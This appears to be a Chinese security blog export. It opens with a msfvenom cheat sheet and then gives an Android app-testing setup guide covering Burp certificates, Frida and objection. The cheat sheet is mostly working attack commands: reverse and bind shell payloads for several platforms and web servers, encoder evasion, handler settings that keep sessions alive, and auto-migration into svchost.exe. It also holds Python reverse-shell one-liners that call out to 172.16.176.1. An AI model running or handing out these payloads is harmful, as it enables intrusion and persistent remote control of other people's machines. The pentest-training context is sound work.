查看支持的文件格式：msfvenom -l formats查看payload所需参数：msfvenom -p xxx --list-options查看编码器：msfvenom --list encoders编码参数使用示例：\n-e x86/shikata_ga_nai -i 5 -b &#x27;\\x00\\x0A\\x0D&#x27; //使用shikata_ga_nai编码器编码5次并去除会造成截断的坏字符\n\n在生成 shellcode时记得加-b参数\nmsfvenom -a x86 -p windows/messagebox TEXT=&quot;Exploit test!&quot; -e x86/shikata_ga_nai -i 5 -b &#x27;\\x00\\x0A\\x0D&#x27; -f raw\n\n\n\n常用payloadwindows/exec cmd=calc.exewindows/shell_bind_tcpwindows/meterpreter/bind_tcpwindows/meterpreter/reverse_tcpwindows/x64/meterpreter/reverse_tcplinux/x86/shell_bind_tcplinux/x86/meterpreter_reverse_tcp\n\n\n\nSystem Payloads后面以tcp反弹shell为例。\nLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f elf -o shell.elfmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=123.207.15.73 LPORT=9999 -f elf -o shell.elf\n\nWindowsmessagebox Test\nmsfvenom -a x86 -p windows/messagebox Title=&quot;ssooking&quot; TEXT=&quot;hello, it is a test&quot; -f exe -o hello.exemsfvenom -p windows/messagebox Title=&quot;ssooking&quot; TEXT=&quot;hello, it is a test&quot; -f exe -o hello.exe  #64位\n\nwindows下生成32位&#x2F;64位payload时需要注意系统架构相同。\nmsfvenom -a x86 --platform windows -p windows/shell_bind_tcp RHOST=xxx RPORT=xxx -f exe -o shell.exemsfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exemsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exe\n\n以windows/meterpreter/reverse_tcp为例，该payload默认为32位，也可使用-a x86选项指定。\n如果要生成64位，则payload为windows/x64/meterpreter/reverse_tcp。\nNetcatnc正向连接\nmsfvenom -p windows/shell_hidden_bind_tcp LPORT=xxx AHOST=xxx -f exe -o 1.exe      \n\n\nAHOST：允许连接的主机\n\n nc反弹连接\nmsfvenom -p windows/shell_reverse_tcp LHOST=xxx LPORT=xxx -f exe -o 1.exe\n\nMacmsfvenom -p osx/x86/shell_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell.macho\n\nAndroidmsfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.apk\n\nWeb Payloadsphpmsfvenom -p php/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; -o shell.php &amp;&amp; pbpaste -o-o shell.php\n\naspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f asp -o shell.asp\n\njspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.jsp\n\nwarmsfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f war -o shell.war\n\npythonmsfvenom -p cmd/unix/reverse_python LHOST=xxx LPORT=xxx -f raw -o shell.pymsfvenom -a python -p python/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.py\n\n正向shell\npython/python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.176.1&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;python/python3 -c &quot;exec(\\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;172.16.176.1&#x27;,9999))\\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\&quot;)&quot;\n\nbashmsfvenom -p cmd/unix/reverse_bash LHOST=xxx LPORT=xxx -f raw -o shell.sh\n\nperlmsfvenom -p cmd/unix/reverse_perl LHOST=xxx LPORT=xxx -f raw -o shell.pl\n\nnodejsmsfvenom -p nodejs/shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.js\n\n\n\nMSF监听use exploit/multi/handlerset PAYLOAD &lt;Payload name&gt;set RHOST &lt;RHOST value&gt;set RPORT &lt;RPORT value&gt;set LHOST &lt;LHOST value&gt;set LPORT &lt;LPORT value&gt;set ExitOnSession falseexploit -j -z\n\n直接快速进行监听\nmsf5 &gt; handler -H &lt;RHOST/LHOST&gt; -P &lt;RPORT/LPORT&gt; -p windows/meterpreter/reverse_tcp\n\n其他设置自动执行脚本如：自动执行post/windows/manage/migrate 模块，该模块的功能注入其他进程\nset AutoRunScript post/windows/manage/migrate\n\n自动注入进程set prependmigrate trueset prependmigrateProc svchost.exe\n\nPS：一些高级参数在使用msfvenom生成木马的时候就可以设置，如直接生成能够自动注入svchost.exe的木马。\nmsfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -i 5 -b &#x27;\\x00\\x0A\\x0D&#x27; PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe\n\nhandler高级配置show advanced查看高级配置参数：\nset exitonsession false //可以让建立监听的端口继续保持侦听，可以接受多个sessionset stagerverifysslcert false //防止获取shell的时候出现的SSL_accept错误set SessionCommunicationTimeout 0  //防止会话在长时间(默认存活300秒,5分钟)无操作时被杀死set SessionExpirationTimeout 0 //防止会话将被强制关闭(默认保留604800秒,一周)\n\n","categories":["神兵利器"],"tags":["kali","metasploit","RAT","木马后门"]},{"title":"APP测试环境工具","url":"/2019/09/app%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%B7%A5%E5%85%B7/","content":"Android SDKhttps://www.androiddevtools.cn/\nhttps://stackoverflow.com/questions/2677431/where-to-install-android-sdk-on-mac-os-x\nhttps://www.androidcentral.com/installing-android-sdk-windows-mac-and-linux-tutorial\n1、MacOS使用brew安装\nbrew cask install android-sdkbrew install android-build-tools\n\nYou will have to add the ANDROID_HOME to profile (.zshrc or .bashrc)\nexport ANDROID_HOME=/usr/local/share/android-sdk\n\n该方法安装时会出现未验证证书问题，参考下文解决方法。\n2、通过Android Studio安装，参考链接\n手工安装SDK环境\nSDK tools\nSDK platform-tools\nSDK build-tools（可选）\n\n国内镜像：https://mirrors.cloud.tencent.com/AndroidSDK/\n1、sdk tools\nwget https://dl.google.com/android/repository/sdk-tools-darwin-4333796.zipunzip sdk-tools-darwin-4333796.zipmkdir /usr/local/opt/android-sdkmv tools /usr/local/opt/android-sdk\n\n2、sdk platform-tools\n下载地址 https://developer.android.com/studio/releases/platform-toolsunzip xxx.platform-tools_r30.0.4-darwin.zipmv platform-tools /usr/local/opt/android-sdk\n\n参考 安装adb调试工具\n3、sdk build tools（可选）\nbuild-tools_r28.0.2：android9\nbuild-tools_r30.0.1: android11\n下载对应压缩包，解压后放到/usr/local/opt/android-sdk/build-tools\n最后添加环境变量\nexport ANDROID_SDK_ROOT=/usr/local/opt/android-sdkexport PATH=$PATH:$ANDROID_SDK_ROOT/toolsexport PATH=$PATH:$ANDROID_SDK_ROOT/tools/binexport PATH=$PATH:$ANDROID_SDK_ROOT/platform-toolsexport PATH=$PATH:$ANDROID_SDK_ROOT/build-tools\n\n或者\nexport ANDROID_HOME=/usr/local/opt/android-sdkexport PATH=$&#123;PATH&#125;:$ANDROID_HOME/tools:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools\n\n添加完环境变量后测试命令\n$ adb versionAndroid Debug Bridge version 1.0.41Version 30.0.4-6686687Installed as /usr/local/opt/android-sdk//platform-tools/adb\n\n\n\n安装SDK时可能遇到的问题解决未验证license问题File /Users/ssooking/.android/repositories.cfg could not be loaded.Checking the license for package Android SDK Build-Tools 28.0.3 in /usr/local/opt/android-sdk/licensesWarning: License for package Android SDK Build-Tools 28.0.3 not accepted.Checking the license for package Android SDK Platform 28 in /usr/local/opt/android-sdk/licensesWarning: License for package Android SDK Platform 28 not accepted.\n\n 解决方法\ncd /usr/local/opt/android-sdk/tools/bin./sdkmanager --licenses\n\n一路输入y，接受证书。成功后，/usr/local/opt/android-sdk/会生成licenses目录\n编译项目时找不到SDK路径FAILURE: Build failed with an exception.* What went wrong:A problem occurred configuring project &#x27;:app&#x27;.&gt; SDK location not found. Define location with sdk.dir in the local.properties file or with an ANDROID_HOME environment variable.* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output. Run with --scan to get full insights.* Get more help at https://help.gradle.org\n\n这个问题是找不到SDK路径，可以到 android&#x2F; 文件夹下找到 local.properties 文件，如果没有就创建一个，然后在里面修改对应的sdk路径。修改local.properties\nsdk.dir = /usr/local/opt/android-sdk/\n\n\n\nMacOS ADB问题如果您的Mac已安装EasyTether应用程序，则可能会干扰ADB。\n在此页面中，您可以执行以下命令：\nsudo kextunload /System/Library/Extensions/EasyTetherUSBEthernet.kext \n\n这将卸载您的EasyTether扩展。如果您需要重新启用EasyTether进行网络共享，可以使用：\nsudo kextload /System/Library/Extensions/EasyTetherUSBEthernet.kext \n\n\n\n反编译工具常用工具\n无论是什么平台，反编译APK都离不开apktool、dex2jar、jd-gui ：\n\napktool：一款Apk逆向工具，有编译、反编译、签名等功能。\ndex2jar：作用主要是将dex文件转换成jar文件，转换成jar借助JD-GUI来查看反编译class代码；\njd-gui：一款Java反编译器GUI，可以查看到dex反编译后的class代码，通常需要配合dex2jar使用；\nobjdump：反编译Android原生库(C&#x2F;C++)，以及ARM平台的的二进制可执行文件\nhttps://github.com/Jermic/Android-Crack-Tool\n\nAndroid反编译——Mac篇\n其他工具：jadx-gui、classyshark、bytecode-viewer\nMac安装\n# Install apktoolbrew install apktool# Install dex2jarwget https://nchc.dl.sourceforge.net/project/dex2jar/dex2jar-2.0.zipunzip dex2jar-2.0.zipcd dex2jar-2.0sudo chmod +x d2j-dex2jar.shsudo chmod +x d2j_invoke.sh./d2j-dex2jar.sh\n\napktool会被安装在：\n/usr/local/Cellar/apktool/[version]/  linked to /usr/local/bin/apktool\n为了使用方便，可以给dex2jar设置软链接：\nsudo mv dex2jar-2.0 /usr/local/Cellar/sudo ln -s /usr/local/Cellar/dex2jar-2.0/d2j-dex2jar.sh /usr/local/bin/d2j-dex2jar\n\n\n\nAndroid抓包工具手机端\n\nPostern\nHttpCanary\n\nPC端\n\nBurpSuite\nCharles\nFildder\n\n抓https需要先安装工具提供的证书\n1.启动Burp Suite，Proxy &gt; Options &gt; Import&#x2F;Export CA certificate\n以der格式导出Burp证书，保存为.cer&#x2F;.crt文件。例如cacert.cer&#x2F; cacert.crt\n2.在Android的&#x2F;sdcard&#x2F;中推送cacert.cer证书\nadb push ~/TMPFile/burp123.cer /sdcard/Download/\n\n3.打开手机设置，选择从SD卡安装CA证书，选择cacert.cer或者crt文件。\n\nAndroid 7.0及以下：设置→安全→从SD卡安装CA证书\nAndroid 7.0以上：设置→安全→加密与凭据→从SD卡&#x2F;存储设备安装CA证书\n\n如果证书安装正常，在设置→安全→可信凭证→用户下看到PortSwigger。\nAndroid 7.0及以上版本证书问题https://www.theburpsuite.com/2020/05/intercepting-android-application-https.html\nAndroid 7.0及更高版本，Google已实施了一些安全功能以减少攻击面。面向API级别24+的应用程序不再信任用户安装的证书颁发机构（CA）。可以在此处阅读更多信息。\n\n用户证书存储路径在/data/misc/user/0/cacerts-added/；\n\n系统证书存储路径在/system/etc/security/cacerts\n\n\n我们可以将Burp或者Charles的证书作为系统信任证书安装。\n导出Burp der格式的证书后，使用openssl来进行转换。然后使用adb将&lt;hash&gt;.0文件push到模拟器的&#x2F;system&#x2F;etc&#x2F;security&#x2F;文件夹中，并将权限修改为644。\nopenssl x509 -inform DER -in burp.der -out burp.pem  openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1cp burp.pem 9a5ba575.0adb push 9a5ba575.0 /data/local/tmpadb shellsumount -o remount,rw /systemcd /data/local/tmpcp 9a5ba575.0 /system/etc/security/cacerts/cd /system/etc/security/cacertschmod 644 9a5ba575.0rebootopenssl x509 -inform DER -in PortSwiggerCA.crt -out PortSwiggerCA.pemopenssl x509 -inform PEM -subject_hash_old -in PortSwiggerCA.pem|head -1mv cacert.pem &lt;hash&gt;.0adb push &lt;hash&gt;.0 /system/etc/security/cacertsadb shell chmod 644 /system/etc/security/cacerts/&lt;hash&gt;.0# OK $ ls | grep cacertcacert.der# 转换成PEM文件$ openssl x509 -in cacert.der -inform DER -outform PEM -out cacert.pem# 提取hash$ openssl x509 -inform PEM -subject_hash -in cacert.pem | head -17bf17d07# 生成新的带指纹的证书文件7bf17d07.0 $ cat cacert.pem &gt; 7bf17d07.0 openssl x509 -inform PEM -text -in cacert.pem -out /dev/null &gt;&gt; 7bf17d07.0//openssl x509 -inform PEM -fingerprint -sha1 -in cacert.pem -out /dev/null &gt;&gt; 7bf17d07.0$ adb push 7bf17d07.0 /data/local/tmp$ adb shell                          raphael:/ $ su (这里需要点击手机root权限授权弹框)raphael:/ # mount -o rw,remount /raphael:/ # mv /data/local/tmp/7bf17d07.0 /system/etc/security/cacerts/7bf17d07.0raphael:/ # chmod 644 /system/etc/security/cacerts/7bf17d07.0    \n\n\n\n\n\nAndroid使用证书的哈希值并在末尾添加.0来重命名和存储证书。如果安装了多个设备的Burpsuite CA证书，则末尾序号会进行递增，如9a5ba575.1。\n例如，我的cacert.cer证书存储为9a5ba575.0。通过输入su进入adb shell并成为root用户，然后输入。\nadb shellsucd /data/misc/user/0/cacerts-added/blueline:/data/misc/user/0/cacerts-added # ls9a5ba575.0  9a5ba575.1cp 9a5ba575.1 /system/etc/security/cacerts/cd /system/etc/security/cacertschmod 644 9a5ba575.1reboot\n\n也可以利用Magisk的一个插件模块自动实现这样的功能。\n在Magisk中安装Magisk Trust User Certs、MoveCertificates模块。此模块会将所有安装的用户证书添加到Android系统信任证书存储中。\n1.单击此处 下载最新版本的.zip文件。 \n2.将下载的zip文件推送到Android设备的/sdcard/Download/ \n3.打开Magisk，转到模块，单击加号，然后选择MagiskTrustUserCerts.zip文件路径以安装该模块。单击重新启动以激活该模块。\n4.打开Magisk并转到模块以检查是否已安装Always Trust User Certificates模块。\n这样以普通用户身份安装在/data/misc/user/0/cacerts-added/下的Burp Suite CA，在重启手机后将同样安装在/system/etc/security/cacerts作为系统信任证书。\nhttps://medium.com/bugbountywriteup/android-pentesting-lab-4a6fe1a1d2e0\nburpsuite导出证书为der格式\nUse Openssl to convert DER to PEM and rename to &lt;cert-hash&gt;.0\n# Convert certificate format from DER to PEM$ openssl x509 -inform DER -in cacert.der -out cacert.pem\t#Display the &quot;hash&quot; of the certificate subject name$ openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1\t# Move cert.pem and rename to &lt;hash&gt;.0$ mv cacert.pem 9a5ba575.0\n\n\n\nhttps://www.bbsmax.com/R/Vx5ML2YYJN/\nhttps://www.bbsmax.com/A/o75NX24ezW/\n抓包工具：https://www.zhihu.com/question/20467503\n设置抓包代理配置模拟器的代理网络\n设置→Wi-Fi→ WiredSSID→ 修改网络 →代理→手动设置\n鼠标长按 wiredSSID—》修改网络：\n手动设置代理为burpsuite 添加的代理地址\nAndroid调试工具Objectionsudo -H pip3 install objection\n\n实际上，只要计算机上安装了objection，Frida也会自动被安装。\nhttps://nosec.org/home/detail/2192.html\n使用objection\nobjection -g com.xxx.xx explorexxxx [usb] #android sslpinning disable --quiet\t\t#绕过证书SSL Pinning\n\n\n\n# Hook Java方法android hooking watch class_method com.xxx.xxx.methodName --dump-args --dump-backtrace --dump-return# Hook Java类android hooking watch class com.xxx.xxxhttp://91fans.com.cn/post/pxxone/# 有的情况下， 我们可以快速测试和hook来查看关键key（较为简单的app）使用objection来实现，这样连代码都不用写就可以完成需求。 比如我们用jadx观察可疑点，然后上hook# 注意这里是直接hook类，她会打印内中所有函数android hooking watch class_method xxx.xxx.xxx --dump-args --dump-backtrace --dump-return \n\n\n\nSpawn方式Hook从Objection的使用操作中我们可以发现，Obejction采用Attach附加模式进行Hook，这可能会让我们错过较早的Hook时机，可以通过如下的代码启动Objection，引号中的objection命令会在启动时就注入App。\nobjection -g packageName explore --startup-command &#x27;android hooking watch xxx&#x27; \n\n\n\n首先加载App，进入交互式分析环境。 objection -g 包名 explore\nobjection -g com.xunmeng.pxxx explore\n\n\n\n然后Hook这两个类:\nandroid hooking watch class &#x27;com.aimi.android.common.service.d$a&#x27;android hooking watch class &#x27;com.xunmeng.pxxx.secure.s&#x27;\n\n这样可以一次性把这两个类下所有的函数都Hook，方便咱们定位到底是哪个函数来做了 anti-token 计算\n1:objection1\n现形了，很明显是 com.xunmeng.pxxx.secure.s.a 函数，不过又遇到一个问题，a函数有好几个重载，而且也看不到他们的入参和返回值？\n这时候就可以使用 android hooking watch class_method 来hook函数，并且打印出入参和返回值:\nandroid hooking watch class_method &#x27;com.xunmeng.pxxx.secure.s.a&#x27; --dump-args --dump-return\n\n\n\n\n\nfridaAndroid Hook工具之Frida 安装配置教程\nFrida是一款基于Python + JavaScript的Hook调试框架，可以将自己编写的JavaScript代码注入到Windows，MACOS，Linux， iOS，Android和QNX 的应用中从而进行Hook，其实Frida功能不仅仅是Hook，还包括以下这些功能:\nsudo -H pip3 install frida-toolssudo pip3 install frida-tools --upgradesudo python3 -m pip install frida-tools\n\n如果安装时报错如下：\nerror: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1076)&gt;\n\n解决方法是去Applications的Python下找到Install Certificates.command，执行后重新安装frida-tools即可\n安装时到编译阶段时，可能会卡住，需要手工安装\nBuilding wheel for frida (setup.py) ... \\\n\n在上面的安装命令输出结果中找到frida版本，直接下载对应平台的frida Python库的安装包，frida python库地址：https://pypi.org/project/frida/#files。\n这里需要注意下载的版本，比如当前系统是macOS10.15，Python是3.8，就应该下载frida-12.7.11-py3.8-macosx-10.6-intel.egg、frida-15.1.9-py3.8-macosx-10.9-x86_64.egg 。\negg文件是一种打包，后缀名可以改成rar，直接解压缩，按照源码的形式安装，即把egg文件和egg文件解压出来的文件夹直接复制到Python的第三方库文件夹…Lib\\site-packages中。\n默认python路径/Library/Python/3.8/site-packages/\n下载完成后直接安装：\nsudo easy_install frida-12.11.17-py3.8-macosx-11.0-arm64.eggsudo python3 -m easy_install frida-12.11.17-py3.8-macosx-11.0-arm64.egg\n\n安装完成后，在终端中输入frida-ps命令查看，如果能显示当前系统进程则证明安装成功\nfrida-server注意：frida-server需要以root权限运行\n直接去frida release 下载对应的版本即可\n\n注意：frida-server的版本必须跟宿主机的frida版本保持一致。比如宿主机Frida版本是12.7.6，Android手机是arm64的，则应该下载：frida-server-12.7.6-android-arm64.xz。\n忘记frida版本可以使用frida --version命令查看。如果不知道 Android架构信息，可以 adb shell 然后执行cat /proc/cpuinfo命令查看。\n\n如果是在模拟器进行调试，下载frida-server-x.x.x-android-x86_64或者x86的；\n如果使用实体手机进行调试，下载frida-server-x.x.x-android-arm\n注意：genymotion是32位，需要下载frida-server-xx.x.x-android-x86.xz\n下载后解压文件，并将二进制文件重命名为: frida-server, 并使用adb push命令推送到手机中\nadb push frida-server /data/local/tmp/adb push frida-server-15.1.9-android-x86_64 /data/local/tmp/ adb shell &quot;chmod 777 /data/local/tmp/frida-server-15.1.9-android-x86_64&quot;adb shell &quot;nohup /data/local/tmp/frida-server-15.1.9-android-x86_64 &amp;&quot;\n\n推送完成后将frida-sever赋予执行的权限，并启动frida-server，使用以下命令:\nadb shellsucd /data/local/tmp/chmod 777 frida-servernohup ./frida-server &amp;或者adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;adb shell &quot;/data/local/tmp/frida-server &amp;&quot;#如果要监听端口：./frida-server 0.0.0.0:8888#Unable to load SELinux policy from the kernel: Failed to open file “/sys/fs/selinux/policy”: Permission deniedadb shell &quot;su -c setenforce 0&quot;ps -e | grep frida-serverkill -9 your_process_id\n\n如果执行frida-server时出现卡死的情况，可以参考。\n然后在终端中执行\nfrida-ps -Ufrida-ps -Uai  #查看手机进程的名字及包名objection -g com.szlanyou.iov explore\n\n应该就会看到如下进程列表了\nPID  Name-----  ----------30141  adbd23825  android.process.acore11070\n\n参数-U 代表USB，意思让Frida检查USB设备，使用frida-ps -R 也可以，但是需要进行转发。执行adb forward tcp:27042 tcp:27042后执行frida-ps -R也可以看到手机上的进程.到此为止，Frida工作环境已经准备好了，下一篇文章介绍一下Android Hook工具之Frida 基础使用\n如果frida-server没有正常运行，会出现以下情况的报错\nFailed to enumerate processes: unable to connect to remote frida-server: Unexpected lack of content trying to read a line\n\n\n\nfrida-ps -Uai PID  Name           Identifier                     ----  -------------  -------------------------------       290  Mail           com.apple.mobilemail           objection -g 209 device_type\n\n是的，您可以通过指定-N&#x2F; --network标志然后提供给远程设备--host并--port使用Frida在explore命令之前监听的位置来连接到远程设备。像这样objection -N -h 192.168.0.1 -p 27042 explore。\n我修改了LaunchDaemon的plist，以启动frida-server侦听ip地址。ssh连接似乎也可行，但异议会超时。iPad上的ps：ps aux root 1030 0.0 0.3 683248 2776 ?? Ss 11:27PM 0:00.03 /usr/sbin/frida-server -l 10.0.1.132:27042这就是我在Linux系统上得到的~ # objection -N -h 10.0.1.132 -p 27042 explore                                                             \n\n\n\n最后分享一个小工具：frida-server start&#x2F;stop 脚本。\n注入进程https://zhuanlan.kanxue.com/article-350.htm\n在 iPhone 上部署 Frida 框架的官方教程（含越狱和非越狱环境，英文）：www.frida.re/docs/ios/ 116    给frida 做了个图形界面，动态分析iOS 应用 - iOS逆向论坛\nfrida基本命令\nfrida-ls-devicesfrida-ps -Uaifrida-discover &lt;PID of calendar app&gt;\n\n调试某个PID的进程\nfrida-ps -Uai PID  Name           Identifier                     ----  -------------  -------------------------------       290  Mail           com.apple.mobilemail  objection -g 209 explore\n\n\n\necho &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; .zshrcecho &#x27;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; /etc/profileecho &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; /etc/profile\n\n\n\n\n强制启动一个应用进程frida -U --no-pause -f [应用包名]使用-f选项表示强制启动一个应用程序，--no-pause选项表示不中断应用程序的启动，如果不使用这个选项总是会遇到 在强制启动应用程序2秒左右后程序自动退出，例: 强制启动Chrome并attach到当前进程\n\nfrida -U --no-pause -f com.android.chrome\n\n使用Frida框架进行hook  去壳\nFrida使用手册：https://github.com/hookmaster/frida-all-in-one\n免Root运行Fridahttps://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md\nFrida提供了免root的Hook方案，即手动注入frida-gadget库， Objection对其进行了封装，但实际没啥用（搞逆向的怎么会没一台root机器）。除此之外，Objection提供了对IOS的Hook，以及对sslunpinng的处理，Hook剪切板&#x2F;Root检测等，但实际使用中用处不大，一般会选择其他专门的工具，此处不提。\n详情参考Objection github目录下objection—console—helpfiles\nFridaGadget注入源程序首先在原APK的lib目录下分别加入各自架构的FridaGadget库 https://github.com/frida/frida/releases/并在同目录下写入配置文件（执行哪个脚本） 配置文件名就是库名的so前加config.\n使用objection自动完成frida gadget注入到apk中.兼容性较差,不是很推荐.\n» pip3 install -U objection» objection patchapk -s yourapp.apk\n\n\n\n\n\n其他Magisk，它现在有个超强的Magisk Hide功能，能隐藏root状态。\nhttps://www.52pojie.cn/thread-1048786-1-1.html\nFrida GUI Tools\nFridaHooker：android管理启动frida工具\nAppMon—基于Frida的应用程序监视和注入的GUI工具（由@dpnishant提供）\nDwarf\nZentracer：Zentracer采用了Attach方式Hook，在使用前需要启动App\nPassionfruit:iOS应用黑盒评估工具\n\nZentracer\n\n点击打开 “设置” 应用；\n选择 Action → Match RegEx\n输入E:java.io.File，点击add，然后关闭窗口 \n输入M:java.io.File，模糊匹配\n点击 Action → Start\n\nhook类所有方法\nhttps://www.cxyzjd.com/article/m0_37696990/104787127\nDwarf对类或方法查添断点\n菜单栏java下面有两个选项class: 点击class会弹出JVM instector,该标签主要用于对指定的类 构造器及类的方法进行下断点trace:点击trace会弹出JVM trace标签，该签主要用于对指定类进行调用关系的展示\nDwarf断点移除或清空后，该断点不可再次添加，如果需要添加需要重启应用程序：即菜单process-&gt;restart 快捷键F9\n在断点处停下时，会出现一个JVM debugger标签，可以此时可以看到一些拦截到的变量值；\n最右侧的threads则显示当前当前线程，可以选中内容右健&#x3D;&gt;resume进行断点释放。如果有多个断点则resume,右下角的日志栏也有相应信息\n注：菜单process-&gt; step F7 ,setp call f8 ，step block也可以释放断点，目前测试功能好像一样，释放断点后如需再次对该方法进行断点需要重启\ntrace列是要查看调用关系的类class列是显示所有已加载的类，可以右键-》search进行过滤显示，选择要trace的类双击，然后在trace会添加上选择的类\nAPP审计工具Android测试环境虚拟机：https://androidtamer.com/tamer4-release\nhttps://github.com/facebook/mariana-trench     针对Android和Java的静态代码审计工具\nhttps://bbs.pediy.com/thread-269196.htm\nAndroid漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF\nhttps://github.com/LoRexxar/Kunlun-M\nhttps://github.com/MobSF/Mobile-Security-Framework-MobSF\nhttps://bbs.pediy.com/thread-269196.htm\ndocker pull opensecurity/mobile-security-framework-mobsfdocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latestgit clone https://github.com/LoRexxar/Kunlun-M.git &amp;&amp; cd Kunlun-Msudo docker build -t kunlun-m -f ./docker/Dockerfile .\n\n\n\n\n\nMobileSFhttps://mobsf.github.io/docs/\nhttps://mp.weixin.qq.com/s/-4F5o54Sqo4YL85hzQr_rg\n&#x2F;Users&#x2F;ssooking&#x2F;.MobSF&#x2F;config.py\n如果 Dynamic Analyzer 没有检测到您的 android 设备，您需要ANALYZER_IDENTIFIER在~/.MobSF/config.py环境变量中或通过环境变量手动配置ANALYZER_IDENTIFIER。\n例子：ANALYZER_IDENTIFIER = &#39;192.168.56.101:5555&#39;。\n可以从 Genymotion 标题栏中找到 Android 设备 IP，默认端口为5555.\n./mac_run.sh 127.0.0.1:8000\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n推荐七个有代表性的免费APP应用安全测试工具：\n1)OWASPZedAttackProxy(ZAP)\nOWASPZAP是目前最流行的免费APP移动安全测试工具，由全球数百个志愿者维护。该工具可以在APP的开发和测试阶段自动查找安全漏洞。OWASPZAP同时还是高水平渗透测试专家非常喜爱的手动安全测试工具。\n2)QARK(QuickAndroidReviewKit)\nQARK是一种Android程序源代码安全漏洞分析工具。该工具有自己的开发社区，任何人都可以免费使用。QARK还会尝试提供提供动态生成的AndroidDebugBridge（ADB）命令来帮助核实潜在漏洞。\n3)Devknox\n对于使用AndroidStudio开发Android应用程序的开发者来说，Devknox是此类移动安全检测工具种的佼佼者，Devknox不但能检测基本的移动安全问题，还能向开发者提供问题修复的实时建议。\n4)Drozer\nDrozer是一个相当全面的Android安全与攻击框架，这个移动app安全测试工具能够通过进程间通讯机制（IPC）与其他Android应用和操作系统互动，这种互动机制使其有别于其他自动化扫描工具。\n5)MobSF(MobileSecurityFramework)\nMobileSecurityFramework是一个自动化的移动app安全测试工具，支持Android和iOS双平台，能够进行静态、动态分析以及webAPI测试。MobSF经常被用来对Android或iOSapp进行快速安全分析，支持二进制（APK&amp;IPA）形式以及源代码的zip压缩包。\n6)Mitmproxy\nMitmproxy是一个免费的开源工具，可以用于拦截、检测、修改或延迟app与后端服务之间的通讯数据，该工具的名字也可以看出这是一种类似中间人攻击的测试模式。当然，这也意味着该工具确实可以被黑客利用。\n7)iMAS\niMAS也是一个开源移动app安全测试工具，可以帮开发者在开发阶段遵守安全开发规则，例如应用数据加密、密码提示、预防应用程序篡改、在iOS设备中部署企业安全策略等。无论是检查设备越狱，保护驻内存敏感信息还是防范二进制补丁，iMAS能为你的iOS程序在充满敌意的环境中提供安全保障。\n参考：https://blog.csdn.net/u010278862/article/details/73240573参考：https://blog.csdn.net/u013107656/article/details/52876312\n在线安全测试工具https://open.appscan.io/tools\n\n腾讯金刚审计系统 http://service.security.tencent.com/kingkong 免费 无限制\n腾讯御安全 http://yaq.qq.com/ 免费 查看漏洞详情需认证\n阿里聚安全 http://jaq.alibaba.com/ 免费 查看漏洞详情需认证\n360显微镜 http://appscan.360.cn/ 免费 无限制\n360APP漏洞扫描 http://dev.360.cn/html/vulscan/scanning.html 免费 无限制\n百度MTC http://mtc.baidu.com 9.9元&#x2F;次 无限制\n梆梆 https://dev.bangcle.com 免费 无限制\n爱内测 http://www.ineice.com/ 免费 无限制\n通付盾 http://www.appfortify.cn/ 免费 无限制\nNAGA http://www.nagain.com/appscan/ 免费 无限制\nGES审计系统 http://01hackcode.com/ 免费 无限制\n盘古出品的Janeushttp://appscan.io\nJanus http://cloud.appscan.io\nAPP逆向main_classify_list https://android.fallible.co/\njava在线反编译Java decompiler online http://www.javadecompilers.com\n腾讯电脑管家：哈勃 http://habo.qq.com/\n腾讯TSRC：金刚 http://service.security.tencent.com/\n阿里聚安全：http://jaq.alibaba.com/\n西安交通大学 sanddroid：http://sanddroid.xjtu.edu.cn/#home\n瀚海源文件B超：https://b-chao.com\n\nAndroid调试分析在抓包过程中看到：请求参数中包含了一个key, 它的值是加密的。\n&#x2F;&#x2F; 启动Monitor\ncd 